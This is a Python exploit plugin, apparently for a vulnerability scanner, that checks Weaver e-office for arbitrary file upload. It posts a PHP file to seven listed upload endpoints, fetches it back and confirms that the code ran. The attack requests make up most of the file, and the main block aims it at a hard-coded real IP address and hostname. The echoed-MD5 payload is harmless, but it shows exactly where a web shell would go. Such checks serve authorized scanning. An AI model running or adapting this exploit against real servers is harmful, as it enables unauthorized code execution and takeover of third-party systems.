#!usr/bin/env python
# *-* coding:utf-8 *-*

'''
name: 泛微e-office多处任意文件上传
author: yichin
refer: http://www.wooyun.org/bugs/wooyun-2015-0125592
description:
    webservice/upload.php
    webservice/upload/upload.php
    webservice-json/upload/upload.php
    webservice-xml/upload/upload.php
    
    inc/jquery/uploadify/uploadify.php
    general/weibo/javascript/LazyUploadify/uploadify.php
    general/weibo/javascript/uploadify/uploadify.php
'''
import re

def assign(service, arg):
    if service == 'weaver_oa':
        return True, arg

def audit(arg):
    content_type = 'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryVO9PKsatIjWx0zBn'
    md5_1 = 'c4ca4238a0b923820dcc509a6f75849b'
    post = '''------WebKitFormBoundaryVO9PKsatIjWx0zBn
Content-Disposition: form-data; name="file"; filename="test.php"
Content-Type: text/html

<?php echo md5(1); ?>
------WebKitFormBoundaryVO9PKsatIjWx0zBn--
'''
    #第一处 几处代码相同
    urls = [
        arg + 'webservice/upload.php',
        arg + 'webservice/upload/upload.php',
        arg + 'webservice-json/upload/upload.php',
        arg + 'webservice-xml/upload/upload.php'
    ]
    for url in urls:
        code, head, res, err, _ = curl.curl2(url, header=content_type, post=post)
        if code == 200:
            m = re.search(r'([\d]*)\*test.php', res)
            if m:
                code, head, res, err, _ = curl.curl2(arg + 'attachment/' + m.group(1) + '/test.php')
                if (code==200) and (md5_1 in res):
                    security_hole('Arbitrarily file upload: ' + url)
    
    #第二处
    url = arg + 'inc/jquery/uploadify/uploadify.php'
    post = '''------WebKitFormBoundaryVO9PKsatIjWx0zBn
Content-Disposition: form-data; name="Filedata"; filename="test.php"
Content-Type: text/html

<?php echo md5(1); ?>
------WebKitFormBoundaryVO9PKsatIjWx0zBn--
'''
    code, head, res, err, _ = curl.curl2(url, header=content_type, post=post)
    if code == 200:
        m = re.search(r'[\d]{10}', res)
        if m:
            code, head, res, err, _ = curl.curl2(arg + 'attachment/' + m.group(0) + '/test.php')
            if code == 200 and (md5_1 in res):
                security_hole('Arbitrarily file upload: ' + url)
    
    #第三处
    url = arg + 'general/weibo/javascript/uploadify/uploadify.php'
    #post同上
    code, head, res, err, _ = curl.curl2(url, header=content_type, post=post)
    if code == 200:
        code, head, res, err, _ = curl.curl2(arg + 'attachment/personal/_temp.php')
        if (code==200) and (md5_1 in res):
            security_hole('Arbitrarily file upload: ' + url)

    #第四处
    url = arg + 'general/weibo/javascript/lazyUploadify/uploadify.php'
    #post同上
    code, head, res, err, _ = curl.curl2(url, header=content_type, post=post)
    if code == 200:
        m = re.search(r'attachmentID":([\d]*),', res)
        if m:
            code, head, res, err, _ = curl.curl2(arg + 'attachment/' + m.group(1) + '/test.php')
            if (code==200) and (md5_1 in res):
                security_hole('Arbitrarily file upload: ' + url)
    
if __name__ == '__main__':
    from dummy import *
    #audit(assign('weaver_oa', 'http://eoffice.sccm.cn/')[1])
    audit(assign('weaver_oa', 'http://219.232.254.131:8082/')[1])